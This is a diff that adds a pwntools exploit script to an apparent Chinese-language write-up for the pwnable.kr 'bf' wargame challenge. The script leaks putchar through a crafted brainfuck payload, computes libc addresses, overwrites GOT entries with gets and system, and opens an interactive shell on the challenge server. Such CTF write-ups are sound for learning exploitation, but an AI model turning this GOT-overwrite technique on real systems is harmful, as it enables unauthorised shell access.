@@ -116,7 +116,30 @@ main 地址 0x8048671
 exp:
 
 ```
+from pwn import *
 
+r=remote("pwnable.kr",9001)
+e=ELF('./bf_libc.so')
+
+r.recvuntil('[ ]\n')
+r.sendline("<"*0x70+'.'+'.>'*4+'<'*4+',>'*4+'<'*8+',>'*4+'<'*(0x2c-0x10+4)+',>'*4+'.')
+r.recv(1)
+putchar_addr=u32(r.recv(4))
+
+
+libc_offset = putchar_addr - e.symbols['putchar'];
+
+gets_addr = libc_offset + e.symbols['gets'];
+
+sys_addr = libc_offset + e.symbols['system'];
+main_addr = 0x08048671
+
+r.send(p32(main_addr))
+r.send(p32(gets_addr))
+r.send(p32(sys_addr))
+
+r.sendline('/bin/sh\0')
+r.interactive()
 
 
 ```
